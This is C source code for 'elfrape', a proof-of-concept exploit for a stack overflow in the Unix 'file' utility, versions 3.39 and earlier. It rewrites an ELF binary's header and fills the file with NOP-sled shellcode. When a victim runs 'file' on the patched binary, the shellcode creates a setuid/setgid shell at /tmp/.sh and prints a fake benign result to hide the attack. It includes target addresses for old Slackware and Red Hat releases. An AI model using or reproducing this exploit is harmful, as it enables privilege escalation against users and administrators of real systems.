/*
** elfrape BY lem0n (lem0nxx@hotmail.com)
** a glorified stack overflow in file<=3.39 
**
** "lame code for a lame bug"
**
** this bug was discovered by iDEFENSE retards
** (actually i discovered it and they bought it from 
** me for $8, all that it is really worth)
**
** this code is mainly proof of concept and it has very little use
** "in the wild" unless your sysadmins and friends are morons.
**
** specify a valid elf binary, and elfrape will patch it so that
** it will exploit a stack overflow in file<=3.39.  this exploit
** relies on the victim user (possibly root, but not required) to
** run file <patchedbinary>.
**
** a glorified stack overflow in file<=3.39
** 
** file-3.37/readelf.c:tryelf()
**   doshn(class, swap,
**         fd,
**         getu32(swap, elfhdr.e_shoff),
**         getu16(swap, elfhdr.e_shnum),
**         getu16(swap, elfhdr.e_shentsize));
**
** note that we can manipulate elfhdr. 
** in doshn() we find a very bad thing...
**
** file-3.37/readelf.c:doshn()
**  if (read(fd, sh_addr, size) == -1)
**
** now, fd is the file its processing, sh_addr is the address of a 32 byte char.  
** size is the value read from the header (elfhdr.e_shentsize).  So we make 
** e_shentsize bigger then it should and voila, we got eip pretty easily.  
** the shellcode cant easily be placed after the address however because file is very 
** sensitive about its fd and the loop variable num being overwritten (it will either
** complain about bad fd and exit or hang in the loop). trying to preserve the values of
** each seemed stupid, so i found the best spot for
** the shellcode placement was in the beginning of the file, after the elf header
** because in the beginning of processing, file reads HOWMANY bytes from the start of the
** file onto the stack.
**     
** #define HOWMANY 16384
**
** that makes for a pretty large landing pad, pop a few thousand nops in there
** and this should be a pretty reliable method.
**
** the shellcode also makes sure to output a seemingly genuine result, which will
** always be filename: data
**
** (16:11)[lem0n@keystone:~/audit/file]$cp /bin/sln sln
** (16:11)[lem0n@keystone:~/audit/file]$./elfrape -t 0 -f sln
**  elfrape file<=3.39 priveledge escalation exploit (by lem0n (lem0nxx@hotmail.com)
**   [patching sln, trying to hit 0xbfffbab0]
**   [setting section header size to trigger overwrite (0x32 bytes)]
**   [setting section header entries to 1 to avoid a big mess on the stack]
**   [writing new header to file]
**   [writing target address to file @offset 0x5f4f0]
**   [filling file with nops and shell code @offset 0x34]
**   [exploit done]
** after someone runs 'file sln', execute /tmp/.sh
** (16:11)[lem0n@keystone:~/audit/file]$cp sln /tmp/whatami
** (16:11)[lem0n@keystone:~/audit/file]$echo and now we wait...
**
** typical sp offsets for -o mode are from -2000 to -6000 
** 
** Will create a 6755 /bin/.sh :>
** 
** Note: may not work if used on files less than 8k or so.
*/
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#define MAX_FILENAME 17/* the longest filename i suggest you use */
#define SHELL "/bin/ash"/* a shell that doesnt do seteuid(getuid()); ash,ksh,zsh,etc */
#define LANDING_SIZE 8192/* pretty big considering its just nops and shellcode */
/* shellcode shamelessly stolen (from ?) and modified */
char shellcode[] =
  "\x31\xc0\x31\xdb\x31"
  "\xd2"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x68" "\x00\x00\x00\x00"
  "\x89\xe1\xb2\x20\x43\xb0\x04\xcd\x80\x31\xc0"
  "\xeb\x31\x5e\x89\x76\xac\x8d\x5e\x08\x89\x5e\xb0"
  "\x8d\x5e\x0b\x89\x5e\xb4\x31\xc0\x88\x46\x07\x88"
  "\x46\x0a\x88\x46\xab\x89\x46\xb8\xb0\x0b\x89\xf3"
  "\x8d\x4e\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c "
  "/bin/cp " SHELL " /tmp/.sh;chmod 6755 /tmp/.sh";
#define EI_NIDENT     16
typedef unsigned short int Elf32_Half;
typedef unsigned long int Elf32_Word;
typedef unsigned long int Elf32_Addr;
typedef unsigned long int Elf32_Off;
typedef struct
{
  unsigned char e_ident[EI_NIDENT];
  Elf32_Half e_type;
  Elf32_Half e_machine;
  Elf32_Word e_version;
  Elf32_Addr e_entry;
  Elf32_Off e_phoff;
  Elf32_Off e_shoff;
  Elf32_Word e_flags;
  Elf32_Half e_ehsize;
  Elf32_Half e_phentsize;
  Elf32_Half e_phnum;
  Elf32_Half e_shentsize;
  Elf32_Half e_shnum;
  Elf32_Half e_shtrndx;
}
Elf32_Ehdr;
struct targets
{
  int target;
  char *description;
  Elf32_Half e_shentsize;
  Elf32_Off e_shoff_delta;
  unsigned long int addr;
};
struct targets targets[] = {
  {0, "Slackware 8.1 (file-3.37-3.1)", 50, 44, 0xbfffc19c},
  {1, "Red Hat Linux release 7.2 (Enigma) (file-3.35)", 80, 76, 0xbfffc19c},
  {2, "Red Hat Linux release 6.2 (Zoot) (file-3.28)", 50, 44, 0xbfffc19c},
  {0, NULL, 0, 0, 0}
};
extern char *optarg;
extern int optind;
void prepare_write_shellcode (char *program);
unsigned long get_sp (void);
void usage (char *argv0);
unsigned long
get_sp (void)
{
  __asm__ ("movl %esp,%eax");
}
int
main (int argc, char *argv[])
{
  int offset, fd, ix, nbytes, c, target = -1;
  unsigned char buff[sizeof (Elf32_Ehdr)];
  unsigned char attack[LANDING_SIZE];
  unsigned char *file = NULL;
  Elf32_Ehdr *ehdr;
  Elf32_Off e_shoff;
  Elf32_Half e_shnum;
  Elf32_Half e_shentsize = 50;
  Elf32_Off e_shoff_delta;
  unsigned long int addr = 1;
  while ((c = getopt (argc, argv, "t:f:o:")) != -1)
    {
      switch (c)
{
case 't':
  target = atoi (optarg);
  break;
case 'f':
  file = (char *) strdup (optarg);
  break;
case 'o':
  addr = 0;
  offset = atoi (optarg);
  break;
default:
  usage (argv[0]);
  break;
}
    }
  printf
    ("elfrape file<=3.39 priveledge escalation exploit (by lem0n (lem0nxx@hotmail.com)\n");
  if (!(file) || ((target == -1) && (addr)))
    usage (argv[0]);
  if (strchr(file,'/'))
   { printf("NO fucking slashes douchebag\n"); exit(-1); }
  
  if (strlen(file) > MAX_FILENAME)
   { printf("Smaller filename please, unless you feel like editing the shell code\n");exit(-1); }
  if (target >= 0)
    {
      if (target >= sizeof (targets) / sizeof (targets[0]) - 1)
{
  fprintf (stderr, "Invalid type\n");
  exit (-1);
}
      e_shentsize = targets[target].e_shentsize;
      e_shoff_delta = targets[target].e_shoff_delta;
      addr = targets[target].addr;
    }
  if ((fd = open (file, O_RDWR)) < 0)
    {
      perror ("open()");
      exit (-1);
    }
  if ((nbytes = read (fd, (char *) buff, sizeof (Elf32_Ehdr))) == -1)
    {
      error ("read failed (%s).\n", strerror (errno));
      exit (-1);
    }
  ehdr = (Elf32_Ehdr *) buff;
  if (addr == 0)
    addr = get_sp () - offset;/* we have a big enough landing point that this addr should work */
  printf ("  [patching %s, tring to hit 0x%x]\n", file, addr);
  printf
    ("  [setting section header size to trigger overwrite (0x%x bytes)]\n",
     e_shentsize);
  ehdr->e_shentsize = e_shentsize;
  printf
    ("  [setting section header entries to 1 to avoid a big mess on the stack]\n");
  ehdr->e_shnum = 1;
/* write the new elf header to the file */
  printf ("  [writing new header to file]\n");
  if (lseek (fd, 0, SEEK_SET) == (off_t) - 1)
    {
      perror ("lseek()");
      exit (-1);
    }
  if (write (fd, buff, sizeof (*ehdr)) == -1)
    {
      perror ("write()");
      exit (-1);
    }
/* seek to where we want our address to wait */
  printf ("  [writing target address to file @offset 0x%x]\n",
  ehdr->e_shoff + e_shoff_delta);
  if (lseek (fd, ehdr->e_shoff + e_shoff_delta, SEEK_SET) == (off_t) - 1)
    {
      perror ("lseek()");
      exit (-1);
    }
  write (fd, &addr, 4);
  memset (attack, 0x90, LANDING_SIZE);
  prepare_write_shellcode (file);
  memcpy (attack + LANDING_SIZE - sizeof (shellcode) - 1, shellcode,
  sizeof (shellcode));
  attack[LANDING_SIZE - 1] = 0x0;
  printf ("  [filling file with nops and shell code @offset 0x%x]\n",
  sizeof (*ehdr));
/* set offset to just after the header, where our code will be */
  if (lseek (fd, sizeof (*ehdr), SEEK_SET) == (off_t) - 1)
    {
      perror ("lseek()");
      exit (-1);
    }
  if (write (fd, attack, LANDING_SIZE) == -1)
    {
      perror ("write()");
      exit (-1);
    }
  printf ("  [exploit done]\n");
  printf ("after someone runs 'file %s', execute /tmp/.sh\n", file);
  close (fd);
  return 0;
}
void
usage (char *argv0)
{
  int ix = 0;
  printf ("Usage: %s -t <target num> -f <existing elf binary filename>\n",
  argv0);
  printf
    ("       %s -o <offset from sp> -f <existing elf binary filename>\n\n",
     argv0);
  while (targets[ix].target || ix == 0)
    {
      printf ("\t#%d: %s\n", targets[ix].target, targets[ix].description);
      ix++;
    }
  exit (-1);
}
/* a quick and dirty hack to let the shellcode have the correct filename */
void
prepare_write_shellcode (char *program)
{
  char *buf;
  int ix;
  char *ptr = shellcode + 37;
  buf = (char *) malloc (strlen (program) + strlen (": data\n"));
  memcpy (buf, program, strlen (program));
  memcpy (buf + strlen (program), ": data\n", 7);
  for (ix = 0; ix < strlen (buf); ix++)
    {
      if (ix && (ix % 4 == 0))
ptr -= 9;
      *ptr = buf[ix];
      ptr++;
    }
  free (buf);
  return;
}